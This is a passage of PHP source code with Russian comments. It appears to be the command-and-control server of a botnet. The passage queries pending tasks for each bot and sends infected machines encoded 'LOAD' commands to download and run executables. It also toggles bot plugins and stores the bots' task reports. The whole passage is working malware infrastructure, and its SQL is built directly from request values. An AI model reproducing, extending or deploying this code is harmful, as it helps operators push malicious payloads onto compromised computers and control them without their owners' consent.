		$db->query($sql);

		// 
		// Мутим действия в зависимости от статуса бота
		// 
		switch ($stat_bot) 
		{
			// Когда бот активен
			case 'online':
				$start_time = microtime(1);
				//
				// Есть ли задания по загрузкам?
				// 
				// Есть ли невыполненные задания по загрузкам, которые не выдавались этому боту?
				$sql = "SELECT fName,tskId,upId,tskPeLoader FROM tasks_t,files_t,loads_t WHERE fId=fk_file_id AND fType='e' 
						AND fk_task_id=tskId AND upStatus=0 AND tskState='1' AND fk_bot_id=".$id_bot;

				$res = $db->query($sql);
				if (!(@($res))) 
				{
					writelog("error.log", "Wrong query : \" $sql \"");
					die();
				}
	
				if($db->affected_rows && list($fname, $tid, $upId, $peldr) = $res->fetch_row() ) 
				{
					// Выдаём задание боту
					// Посылаем боту команду
					$go = "LOAD<br>$tid<br>peldr=$peldr";
					OutEncodedContent($go, $fname);	
					$finish_time = microtime(1);
					writelog("tasks.log", "LOAD (" . ($finish_time - $start_time) . " sec.): \"" . $go . "\""); 
					$isActive = true;
					// Обновляем статус локального задания
					$sql = "UPDATE loads_t SET upStatus=1,upStartTime=CONVERT_TZ(now(),@@time_zone,'+0:00') WHERE upId=$upId";
					$db->query($sql);
					if( $db->affected_rows != 1 ) writelog("error.log", "Wrong query { $sql }");		
					die();
				}

				
				// 
				// Plugins
				// 
				$sql = "SELECT plugin, status FROM plugins WHERE fk_bot = $id_bot";
				$res = $db->query($sql);
				if (!$res)
				{
					writelog("error.log", "Wrong query : \" $sql \"");
					die();
				}
				if ( !$db->affected_rows ) die();
				
				$out = "";
				while (list($plugin, $status) = $res->fetch_array())
				{
					// searching for status of plugin
					$reqst = -1;
					$indx = array_search($plugin, $reqplug);
					if ($indx !== false)
					{
						$reqst = $reqstat[$indx];
					}
					
					if (intval($reqst) != intval($status))
						$out .= "$plugin;$status<br>";
				}
				
				if ( strlen($out) )
					$out = "PLUGIN<br>" . $out;
				else
					die();
				
				//writelog("debug.log", "[$guid] : " . $out);
				OutEncodedContent($out);
				die();
					
				break;
				
			case 'ok':
				(@$_PARAMS['tid']) ? $tid = (int)escapeshellcmd( $_PARAMS['tid'] ) : $tid = 0;

				// Проставляем статус задания как выполненное
				$sql = "UPDATE loads_t SET upStatus=3 WHERE fk_bot_id=$id_bot AND fk_task_id=$tid";
				$db->query($sql);
				if ( $db->affected_rows == -1 )  
				{
					writelog("error.log", "Wrong query : \" $sql \"");
					die();
				}
				
				// Вставляем отчёт		
				$bot_rep = base64_decode( $_PARAMS['rep'] );
				$sql = "SELECT upId FROM loads_t WHERE fk_bot_id=$id_bot AND fk_task_id=$tid LIMIT 1";
				$res = $db->query($sql);
				if( $db->affected_rows != 1 )  
				{
					writelog("error.log", "Wrong query : \" $sql \"");
					die();
				}
				list($upId) = $res->fetch_row();
				$sql = "INSERT DELAYED INTO loads_rep_t VALUES(NULL, '$bot_rep', CONVERT_TZ(now(),@@time_zone,'+0:00'), $upId)";
				$db->query($sql);

				// Меняем статус бота с "Active" на "Online"
				bot_setonline($bot_ver, $os_bot, $ie_bot, $usertp_bot, $id_bot);
				break;
				
			case 'err':
				(@$_PARAMS['tid']) ? $tid = (int)escapeshellcmd( $_PARAMS['tid'] ) : $tid = 0;
				
				// Ставим статус "Error" для последнего задания, что выполнял бот
				$sql = "UPDATE loads_t SET upStatus=2 WHERE fk_bot_id=$id_bot AND fk_task_id=$tid AND upStatus<3";
				$db->query($sql);
				if ($db->affected_rows == -1)  
				{
					writelog("error.log", "Wrong query : \" $sql \"");
					die();
				}
				
				// Вставляем отчёт
				$bot_rep = base64_decode( $_PARAMS['rep'] );
				$sql = "SELECT upId FROM loads_t WHERE fk_bot_id=$id_bot AND fk_task_id=$tid LIMIT 1";
				$res = $db->query($sql);
				if( $db->affected_rows != 1 )  
				{
					writelog("error.log", "Wrong query : \" $sql \"");
					die();
				}
				list($upId) = $res->fetch_row();
				$sql = "INSERT DELAYED INTO loads_rep_t VALUES(NULL, '$bot_rep', CONVERT_TZ(now(),@@time_zone,'+0:00'), $upId)";
				$db->query($sql);
				
				// Меняем статус бота с "Active" на "Online"
				bot_setonline($bot_ver, $os_bot, $ie_bot, $usertp_bot, $id_bot);
				break;
		}
	}
?>